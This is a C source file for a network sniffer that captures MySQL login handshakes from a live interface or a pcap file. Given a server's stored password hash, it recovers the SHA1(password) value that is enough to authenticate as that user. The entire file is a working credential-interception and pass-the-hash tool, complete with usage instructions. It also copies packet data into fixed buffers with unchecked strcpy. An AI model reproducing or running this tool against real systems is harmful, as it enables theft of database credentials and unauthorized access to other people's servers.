#include "uthash.h"

#include <openssl/sha.h>
#include <pcap/pcap.h>

#include <arpa/inet.h>
#include <assert.h>
#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>

#define VERBOSE 0

#define BPF_FORMAT "ip host %s && tcp port %d"
#define SNAPLEN 256
#define MAX_FIELD 1024
#define MYSQL_PROTOCOL_VERSION 10

#define check_pkt(condition, reason)                                           \
    do {                                                                       \
        if (condition) {                                                       \
            if (VERBOSE) {                                                     \
                fprintf(stderr,                                                \
                        "[*] Skipping packet (" reason ") @%d\n", __LINE__);   \
            }                                                                  \
            return;                                                            \
        }                                                                      \
    } while (0)

#define mysql_header_size(header_ptr)                                          \
    ((header_ptr)->size[0] |                                                   \
     ((header_ptr)->size[1] << 8) |                                            \
     ((header_ptr)->size[2] << 16))

struct mysql_header
{
    uint8_t size[3];
    uint8_t number;
}
__attribute__((__packed__));

struct attempt_key {
    uint32_t server_ip;
    uint16_t server_port;
    uint32_t client_ip;
    uint16_t client_port;
};

struct attempt
{
    struct attempt_key key;
    uint8_t salt[SHA_DIGEST_LENGTH];
    char username[MAX_FIELD];
    uint8_t password[SHA_DIGEST_LENGTH];
    int expect; /* 0: empty; 1: need Server Greeting; 2: need Login Request */

    UT_hash_handle hh;
};

struct account
{
    char username[MAX_FIELD];
    uint8_t server_hash[SHA_DIGEST_LENGTH];

    UT_hash_handle hh;
};

static int is_live;
static const char *input;
static const char *server_ip;
static int server_port;
static pcap_t *pcap;
static struct attempt *attempts = NULL;
static struct account *accounts = NULL;

static void dump_hex(const unsigned char *data, size_t length)
{
    size_t i;

    for (i = 0; i < length; i++) {
        printf("%02x", data[i]);
    }
    printf("\n");
}

static void unsha1(uint8_t *sha1_password, const uint8_t *client_password, const uint8_t *salt, const uint8_t *sha1_sha1_password)
{
    uint8_t concat[2 * SHA_DIGEST_LENGTH], salted[SHA_DIGEST_LENGTH];
    size_t i;

    /* compute salted */
    memcpy(concat, salt, SHA_DIGEST_LENGTH);
    memcpy(concat + SHA_DIGEST_LENGTH, sha1_sha1_password, SHA_DIGEST_LENGTH);
    SHA1(concat, 2 * SHA_DIGEST_LENGTH, salted);

    /* compute SHA1(server_password) */
    for (i = 0; i < SHA_DIGEST_LENGTH; i++) {
        sha1_password[i] = client_password[i] ^ salted[i];
    }
}

static void pkt_callback(u_char *user, const struct pcap_pkthdr *pkt_header, const u_char *bytes)
{
    const u_char *todo, *aux;
    bpf_u_int32 todo_len;
    const struct ethhdr *ethernet_header;
    const struct iphdr *ip_header;
    size_t ip_header_size;
    const struct tcphdr *tcp_header;
    size_t tcp_header_size;
    const struct mysql_header *mysql_header;
    struct attempt *attempt;
    struct attempt_key attempt_key = {0};
    int server_to_client;
    struct account *account;

    /* initialize */
    todo_len = pkt_header->caplen;
    todo = bytes;

    /* dissect ethernet */
    assert(todo_len >= sizeof(struct ethhdr));
    ethernet_header = (const struct ethhdr *)todo;
    assert(ntohs(ethernet_header->h_proto) == ETH_P_IP);
    todo += sizeof(struct ethhdr);
    todo_len -= sizeof(struct ethhdr);

    /* dissect ip */
    assert(todo_len >= sizeof(struct iphdr));
    ip_header = (struct iphdr *)todo;
    assert(ntohs(ip_header->protocol == IPPROTO_TCP));
    ip_header_size = ip_header->ihl * sizeof(uint32_t);
    todo += ip_header_size;
    todo_len -= ip_header_size;

    /* dissect tcp */
    assert(todo_len >= sizeof(struct tcphdr));
    tcp_header = (const struct tcphdr *)todo;
    assert(ntohs(tcp_header->source) == server_port || ntohs(tcp_header->dest) == server_port);
    server_to_client = ntohs(tcp_header->source) == server_port;
    tcp_header_size = tcp_header->doff * sizeof(uint32_t);
    todo += tcp_header_size;
    todo_len -= tcp_header_size;

    /* skip invalid mysql header */
    check_pkt(todo_len < sizeof(struct mysql_header), "too short");
    mysql_header = (const struct mysql_header *)todo;
    todo += sizeof(struct mysql_header);
    todo_len -= sizeof(struct mysql_header);

    /* prepare the attempt key */
    if (server_to_client) {
        attempt_key.server_ip = ip_header->saddr;
        attempt_key.server_port = tcp_header->source;
        attempt_key.client_ip = ip_header->daddr;
        attempt_key.client_port = tcp_header->dest;
    } else {
        attempt_key.client_ip = ip_header->saddr;
        attempt_key.client_port = tcp_header->source;
        attempt_key.server_ip = ip_header->daddr;
        attempt_key.server_port = tcp_header->dest;
    }

    /* insert if not present */
    HASH_FIND(hh, attempts, &attempt_key, sizeof(struct attempt_key), attempt);
    if (!attempt) {
        printf("[*] Traffic from a new client detected\n");
        attempt = calloc(1, sizeof(struct attempt));
        assert(attempt);
        attempt->key = attempt_key;
        HASH_ADD(hh, attempts, key, sizeof(struct attempt_key), attempt);
    }

    /* check if done */
    check_pkt(attempt->expect == 2, "done with this attempt");

    /* dissect mysql packets */
    switch (mysql_header->number) {
    case 0:
        /* check expected */
        check_pkt(attempt->expect != 0, "unexpected");

        /* check and skip protocol version */
        check_pkt(todo_len < 1, "too short");
        check_pkt(*todo != MYSQL_PROTOCOL_VERSION, "invalid version");
        todo++;
        todo_len--;

        /* skip server version */
        check_pkt(todo_len < 1, "too short");
        aux = memchr(todo, 0, todo_len);
        check_pkt(!aux, "malformed");
        todo_len -= aux - todo + 1;
        todo = aux + 1;

        /* skip id */
        check_pkt(todo_len < 4, "too short");
        todo += 4;
        todo_len -= 4;

        /* copy and skip the first salt */
        check_pkt(todo_len < 9, "too short");
        check_pkt(todo[8] != 0, "malformed");
        memcpy(attempt->salt, todo, 8);
        todo += 9;
        todo_len -= 9;

        /* skip some fields */
        check_pkt(todo_len < 18, "too short");
        todo += 18;
        todo_len -= 18;

        /* copy the second salt */
        check_pkt(todo_len < 13, "too short");
        check_pkt(todo[12] != 0, "malformed");
        memcpy(attempt->salt + 8, todo, 12);

        /* next */
        printf("[*] Packet 'Server Greeting' received\n");
        attempt->expect++;
        break;

    case 1:
        /* check expected */
        check_pkt(attempt->expect != 1, "malformed");

        /* skip some fields */
        check_pkt(todo_len < 32, "too short");
        todo += 32;
        todo_len -= 32;

        /* copy and skip username */
        check_pkt(todo_len < 1, "too short");
        aux = memchr(todo, 0, todo_len);
        check_pkt(!aux, "malformed");
        strcpy(attempt->username, (const char *)todo);
        todo_len -= aux - todo + 1;
        todo = aux + 1;

        /* skip password length */
        check_pkt(todo_len < 1, "too short");
        check_pkt(*todo != SHA_DIGEST_LENGTH, "malformed");
        todo++;
        todo_len--;

        /* copy hashed password */
        check_pkt(todo_len < SHA_DIGEST_LENGTH, "too short");
        memcpy(attempt->password, todo, SHA_DIGEST_LENGTH);

        /* next */
        printf("[*] Packet 'Login Request' received\n");
        attempt->expect++;

        /* done */
        printf("[+] Handshake completed!\n");
        printf("[+]\n");
        printf("[+] Input:\n");
        printf("[+] - username ........................ '%s'\n", attempt->username);
        printf("[+] - salt ............................ "); dump_hex(attempt->salt, SHA_DIGEST_LENGTH);
        printf("[+] - client session password ......... "); dump_hex(attempt->password, SHA_DIGEST_LENGTH);

        /* check if there is a matching account */
        HASH_FIND_STR(accounts, attempt->username, account);
        if (account) {
            uint8_t sha1_password[SHA_DIGEST_LENGTH], aux[SHA_DIGEST_LENGTH];
            int valid;

            /* un-SHA1 server password */
            unsha1(sha1_password, attempt->password, attempt->salt, account->server_hash);
            printf("[+] - SHA1(SHA1(password)) ............ "); dump_hex(account->server_hash, SHA_DIGEST_LENGTH);
            printf("[+] Output:\n");
            printf("[+] - SHA1(password) .................. "); dump_hex(sha1_password, SHA_DIGEST_LENGTH);

            /* check login correctness */
            SHA1(sha1_password, SHA_DIGEST_LENGTH, aux);
            valid = (memcmp(account->server_hash, aux, SHA_DIGEST_LENGTH) == 0);
            printf("[+] Check:\n");
            printf("[+] - computed SHA1(SHA1(password)) ... "); dump_hex(aux, SHA_DIGEST_LENGTH);
            printf("[+] - authentication status ........... %s\n", valid ? "OK" : "ERROR");
        }
        printf("[+]\n");
        break;

    default:
        check_pkt(1, "wrong packet number");
    }
}

static pcap_t *open_handler()
{
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    pcap_t *pcap;

    /* open handler */
    if (is_live) {
        pcap = pcap_open_live(input, SNAPLEN, 1 /* promisc */, 0 /* to_ms */, errbuf);
    } else {
        pcap = pcap_open_offline(input, errbuf);
    }

    /* check warnings */
    if (*errbuf) {
        fprintf(stderr, "[!] %s\n", errbuf);
    }

    /* check errors */
    if (!pcap) {
        exit(EXIT_FAILURE);
    }

    return pcap;
}

static void check_link_layer_type()
{
    int dlt;

    /* fetch the lynk layer type of the handler */
    dlt = pcap_datalink(pcap);
    assert(dlt != PCAP_ERROR_NOT_ACTIVATED);

    /* check expected value */
    if (dlt != DLT_EN10MB) {
        fprintf(stderr, "[!] ERROR: unexpected link-layer type %s\n",
                pcap_datalink_val_to_name(dlt));
        exit(EXIT_FAILURE);
    }
}

static void set_bpf()
{
    char bpf[1024];
    struct bpf_program fp;

    /* format BPF */
    sprintf(bpf, BPF_FORMAT, server_ip, server_port);

    /* compile BPF program */
    if (pcap_compile(pcap, &fp, bpf, 1 /* optimize */, -1 /* netmask */) != 0) {
        fprintf(stderr, "[!] ERROR: %s\n", pcap_geterr(pcap));
        exit(EXIT_FAILURE);
    }

    /* apply the filter */
    if (pcap_setfilter(pcap, &fp) != 0) {
        fprintf(stderr, "[!] ERROR: %s\n", pcap_geterr(pcap));
        exit(EXIT_FAILURE);
    }

    /* cleanup */
    pcap_freecode(&fp);
}

static void start_packet_loop()
{
    fprintf(stderr, "[+] Waiting for packets...\n");

    switch (pcap_loop(pcap, -1 /* cnt */, pkt_callback, NULL)) {
    case 0: /* EOF */
        break;

    case -1: /* error */
        fprintf(stderr, "[!] ERROR: %s\n", pcap_geterr(pcap));
        exit(EXIT_FAILURE);

    case -2: /* break_loop */
        break;
    }
}

static void cleanup()
{
    pcap_close(pcap);
}

static int parse_sha1(uint8_t *sha, const char *sha_str)
{
    size_t i;

    for (i = 0; i < SHA_DIGEST_LENGTH; i++) {
        if (sscanf(sha_str + 2 * i, "%02hhx", &sha[i]) != 1) {
            return 0;
        }
    }

    return 1;
}

static void parse_arguments(int n_args, char *args[])
{
    int i;

    /* check invocation */
    if (n_args < 4 || (strcmp(args[0], "-i") != 0 && strcmp(args[0], "-r") != 0)) {
        fprintf(stderr,
                "Usage:\n\n"
                "    -i <device> <server-ip> <server-port> [<40-hex-digits-hash>:<user> ...]\n"
                "    -r <pcap>   <server-ip> <server-port> [<40-hex-digits-hash>:<user> ...]\n");
        exit(EXIT_FAILURE);
    }

    /* input type */
    is_live = (strcmp(args[0], "-i") == 0);

    /* set arguments */
    input = args[1];
    server_ip = args[2];
    server_port = atoi(args[3]);

    /* parse accounts */
    for (i = 4; i < n_args; i++) {
        const char *ptr, *username, *server_hash_str;
        uint8_t server_hash[SHA_DIGEST_LENGTH];
        struct account *account;

        /* split account fields */
        ptr = strchr(args[i], ':');
        if (!ptr || ptr - args[i] != 2 * SHA_DIGEST_LENGTH || *(ptr + 1) == '\0') {
            fprintf(stderr, "[!] invalid account format'%s'\n", args[i]);
            break;
        }
        server_hash_str = args[i];
        username = ptr + 1;

        /* parse hash */
        if (!parse_sha1(server_hash, server_hash_str)) {
            fprintf(stderr, "[!] invalid SHA1 hash '%s'\n", server_hash_str);
            break;
        }

        /* add account */
        account = calloc(1, sizeof(struct account));
        assert(account);
        strcpy(account->username, username);
        memcpy(account->server_hash, server_hash, SHA_DIGEST_LENGTH);
        HASH_ADD_STR(accounts, username, account);
    }
}

int main(int argc , char *argv[])
{
    parse_arguments(argc - 1, argv + 1);
    pcap = open_handler();
    check_link_layer_type();
    if (is_live) {
        set_bpf();
    }
    start_packet_loop();
    cleanup();
    return EXIT_SUCCESS;
}

/*
  TODO
  - IPv6 support?
*/
